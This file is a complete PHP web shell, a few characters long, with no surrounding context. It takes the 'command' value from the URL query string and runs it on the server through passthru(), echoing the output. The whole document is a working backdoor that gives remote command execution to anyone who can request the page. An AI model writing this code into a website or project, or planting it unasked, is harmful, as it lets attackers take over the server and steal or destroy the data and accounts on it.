<?php

passthru($_GET[command]);

?>
